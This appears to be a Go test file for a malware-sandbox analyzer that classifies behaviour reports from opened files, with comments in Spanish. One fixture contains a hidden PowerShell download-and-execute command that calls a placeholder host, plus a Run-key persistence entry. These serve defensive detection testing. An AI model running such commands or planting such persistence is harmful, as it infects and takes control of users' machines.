package main

import "testing"

func TestSandboxVerdicts(t *testing.T) {
	// PDF de estudio: se abre en Edge y nada más
	ok, _ := ParseSBReport([]byte("\ufeff" + `{"name":"Tema5.pdf","seconds":60,"opened":true,"procs":[{"pid":10,"ppid":1,"name":"msedge.exe","path":"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"},{"pid":11,"ppid":10,"name":"msedge.exe"},{"pid":12,"ppid":1,"name":"WmiPrvSE.exe"}],
	 "files":[{"p":"C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Microsoft\\Edge\\User Data\\x","s":10}],"decoysTotal":20}`))
	r := BuildDynamic(ok, "pdf")
	if r.Verdict != "Limpio" || r.Viewer != "msedge.exe" || len(r.Procs) != 2 {
		t.Errorf("pdf limpio: %+v", r)
	}
	// Documento que lanza PowerShell que descarga, deja un exe y lo ejecuta, y se instala
	bad, _ := ParseSBReport([]byte(`{"name":"factura.js","seconds":60,"opened":true,"procs":[
	 {"pid":20,"ppid":1,"name":"wscript.exe","cmd":"wscript factura.js"},
	 {"pid":21,"ppid":20,"name":"powershell.exe","cmd":"powershell -w hidden -c (New-Object Net.WebClient).DownloadFile('http://x/a.exe','a.exe'); Start-Process a.exe"},
	 {"pid":22,"ppid":21,"name":"a.exe","path":"C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\a.exe"}],
	 "files":[{"p":"C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\a.exe","s":5000}],
	 "runNew":[{"k":"HKCU:\\...\\Run\\upd","v":"C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\a.exe"}],"decoysTotal":20,"decoysChanged":15}`))
	r = BuildDynamic(bad, "script")
	if r.Verdict != "Peligroso" || len(r.Persist) != 1 || r.Procs[1].Depth != 1 || r.Procs[2].Flag != "peligroso" {
		t.Errorf("malicioso: %+v", r)
	}
	// Combinar: lo estático decía "Sospechoso" por JavaScript, la prueba real sale limpia
	fa := &FAResult{Findings: []Finding{{Level: "warn", Points: 30, Title: "x"}}}
	fa.finish()
	CombineVerdict(fa, BuildDynamic(ok, "pdf"))
	if fa.Verdict != "Sin señales de peligro" || fa.Score > 15 {
		t.Errorf("combinado: %s %d", fa.Verdict, fa.Score)
	}
	// Word sin Office en el entorno: no concluyente
	doc, _ := ParseSBReport([]byte(`{"name":"pedido.docx","seconds":60,"opened":true,"procs":[{"pid":5,"ppid":1,"name":"OpenWith.exe"}],"decoysTotal":20}`))
	if r := BuildDynamic(doc, "office-zip"); r.Verdict != "Limpio" && r.Verdict != "No concluyente" {
		t.Errorf("docx: %+v", r)
	}
}
